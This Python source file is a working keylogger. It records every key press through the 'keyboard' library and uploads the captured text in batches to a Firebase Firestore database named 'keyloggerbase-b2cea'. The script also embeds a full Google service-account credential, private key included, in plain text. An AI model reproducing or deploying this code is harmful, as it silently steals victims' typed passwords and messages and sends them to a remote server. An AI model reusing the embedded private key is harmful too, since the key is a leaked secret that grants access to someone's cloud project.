import keyboard
import firebase_admin
from firebase_admin import credentials
from firebase_admin import firestore
from datetime import datetime 


credentialdata={
  "type": "service_account",
  "project_id": "keyloggerbase-b2cea",
  "private_key_id": "ebba63bac120b85b6794b4448e07058b4e38b327",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCUtZVFbIfyf+0P\nezSKz0ymNPCROJNXQaVdXa56qEy4b+qiwO3BDRkGimPRUq9UHEan8Y46xwL9M1Je\nFm7tiNNsVjyds/v1qk0gVQ9qVasF1TaOXekqokcehjFlZSDTBU1q9WzXefskgWe5\nJ29l5gugMdokaDO1KBLJTDmCZEssGzGcDnLfJ+T7b47IYgkxLD6hqGsHTzMnGOpK\nm32cQGPWkVh/e6jczSbkiE0+ZOG+jpsHk2QqwpbWHnDa+R40y8ip/Sq7ktTtyNAZ\n05cm5goq6Rmero8Y5ZmTxrw5N5kPQHVZ9hl7VXmDUmmqSQV1K6ZP0FSKgNG5U10n\nMerzkoiVAgMBAAECggEAI7zSs3UuY6EKMcEAYsaIS14oHSI9SIgyazJvErOdAmsE\n9pmKWa1h4QBDlkO6dmp4MXab4XS/u2VIy2s1O9j4xE2iMh0VtVd4wwcmFf4iBFwV\nyRd5CEGo+UUzHES2I3hf/08dWdhK+l4t9OFtBE5JZ3VrkPnIyWWoxB8RKAydwyql\nDzB/MHeMKGXH/ODfJfShZG0g87Gc3rA5XoMUN1foyxBR8qa3PHJW/XqKsK3249qy\nPqrJl1b2Zyk++xizyCjRlPdFEvimJ5CzcWD2PvmzYAY0RKG46EFCyKzI5Vj0sMXY\nYmj2eXKQcH3osKjepzUmzAmrwAyhw5PcVw8w0aI7uQKBgQDHaXv1H1+2+tl9Q3Qy\neah31YvZp2qrKY+qUlAczepOVx79iCNOTbt+W3KHvpEvAvRUSBKpoU5XmvWWX098\n0FoMP3Uc6a3jf4mNKwhzvKq8ra1Y9byf6ktLZ5oOkEhx9c68MiUHBNCwHxy6HH6c\nH3JpHAJIYBUh0M2yY5jPnNKV+QKBgQC+6L2VSCONAUxenEbHAYHxOmFCnRGIuJJt\ns45g4FgKVvnUftVpWgScfXA5N7qTfbejVI23NPGEuE+GJYENwemegwmAgoZ95nc5\ngQjJ4Sw91CKlsVpLPxDIIx6rjYYa6Li7OlUuIyJGlaty4C+6Iy4gkDsiEZo0qUl/\n0lozaxU+fQKBgQCGtUt3m2odQfgKFrc4IdccnLWMovv8BGd4t4JG8xOFOHVG7+Bp\n1TkDcuM7sBCDoYtMJCP3U3CI3bVpj5kyx80M2RFUJsfBFzbkll1vUdRFAU5I+jgi\nDzQuDB6WGAHYeiTeHUHGLAqN73aIgxdEgDnZp4IjQkUEQvmxuHZSSa44gQKBgBXB\n1qFlyE9wn3CE5PgXLuT8H0uFNRNc3atM9GQMDVyYTv6tucq47J+dGCYdONFIWZ5u\nq3v+t6vFiaKjMZMMz4A2NOYFeihtFJdkIklHtVASliRGEyFSPaphfkRU67yzWyJT\nYpPQgz6CHjkIXcgb7Ezfwy19zhJEXNEJeygzAwfNAoGAVslDNc3xWQZtpCaL2T1y\nm6tiWaOG2ewfjd2ttWiOWiWfok5ubeQks7aoGdESO8gf8HfF7sI5szYz31H1CEwC\nmmYXWmHhDwHm/k++PV+vQxUUBhkXF7LL6u2MmYA7aEnpokvSu8xECFIgqnnm6GJq\nugvnmfe/6oTv6aTTUMv/KPY=\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-30zq1@keyloggerbase-b2cea.iam.gserviceaccount.com",
  "client_id": "111204172762379035459",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-30zq1%40keyloggerbase-b2cea.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}

cred = credentials.Certificate(credentialdata)
app = firebase_admin.initialize_app(cred)
db=firestore.client()
class Logger:
    
   
    count=0
    flag=False
    def __init__(self) :
        self.s=""
    def add_key(self, key_name):
        if(key_name=="space"):
            Logger.concat(self," ")
        elif(key_name=="enter"):
             Logger.concat(self,"\n")
        elif(key_name=="right shift" or key_name =="shift"):
            pass
        elif(len(key_name)>1 and (self.flag ==False)):
            self.count+=1
            self.flag=True
            
            Logger.concat(self,f"\n{key_name}\n")
           
        elif (len(key_name)>1):
            self.count+=1
            Logger.concat(self,f"\n{key_name}\n")
           
        else:
            self.count+=1
            self.flag=False
            Logger.concat(self,key_name)
            
        if(self.count==30):
            self.count=0
           
            Logger.upload(self)
            #Logger.file.truncate(0)
    
        
        #uploadlog()
        #Logger.file.truncate(0)
        #Logger.file.close()
    def concat(self,str):
        self.s+=str
        
    def upload(self):
        now = datetime.now()
        filename1 = now.strftime("%Y%m%d_%H%M%S_log.txt")
        data={"str":self.s}
        db.collection("log").document(filename1).set(data)

def on_key_release(event):
   logger.add_key(event.name)
 
logger=Logger()
keyboard.on_press(callback=on_key_release)
try:
    keyboard.wait()
finally:
    
    logger.upload()
    
  



  

